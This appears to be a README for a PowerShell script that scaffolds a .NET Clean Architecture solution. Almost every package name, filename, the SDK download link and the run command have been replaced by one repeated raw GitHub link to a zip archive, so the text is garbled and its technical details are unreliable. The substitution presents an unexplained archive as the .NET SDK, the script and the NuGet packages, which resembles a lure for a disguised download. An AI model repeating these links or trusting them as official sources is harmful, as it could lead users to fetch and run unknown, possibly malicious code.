# BlogManager Clean Architecture Starter

## 📌 Introduction  
This PowerShell script helps you quickly create a 5-layer Clean Architecture project structure in .NET Core within seconds.  
It automatically sets up projects, references, folders, base classes, and essential NuGet packages to give you a solid starting point for your application.

---

## 🚀 Features  
- Creates projects for **IOC, Domain, Data, Core** layers and the main solution project  
- Automatically configures project references (reference chain)  
- Installs necessary NuGet packages like Entity Framework Core and https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip Core packages  
- Generates folder structure and base classes such as `BaseEntity`, `DbContext`, and `Paging`  
- Clean, scalable folder organization  
- Supports .NET 9.0 stable version  
- Easy and fast execution via a single PowerShell command

---

## 🎯 Prerequisites  
- [.NET SDK 9.0](https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip)  
- PowerShell (version 5 or higher)  
- Windows OS (other OS support possible with script modification)

---

## 🧑‍💻 How to Use

1. Prepare your solution folder with the `.sln` file in place.  
2. Save the PowerShell script (e.g., `https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip`) in the solution folder.  
3. Open PowerShell and navigate to the solution folder.  
4. Run the script:

```powershell
.\https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip


https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip as projects, folders, and packages are created and installed.
📂 Output Project Structure
SolutionName/
├── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
├── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
├── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
│   ├── Context/
│   │   └── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
│   ├── Repositories/
├── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
│   ├── Interfaces/
│   ├── Enums/
│   ├── Models/
│   │   └── Common/
│   │       └── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
│   ├── ViewModels/
│       └── Common/
│           └── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip
├── https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip

📦 Installed NuGet Packages
| Layer  | Packages                                                                     |
| ------ | ---------------------------------------------------------------------------- |
| Data   | https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip, https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip |
| Domain | https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip, https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip                     |
| Core   | https://raw.githubusercontent.com/MoeinAlvandi/CleanCodeStarter/main/poultryless/CleanCodeStarter-v1.2.zip                                               |

✍️ Customization
You can modify the script as needed to add new layers, folders, base classes, or install additional packages.

🛠️ Support and Contribution
If you have suggestions, issues, or questions, please open an issue in the repository.
Your contributions to improve this project are always welcome!

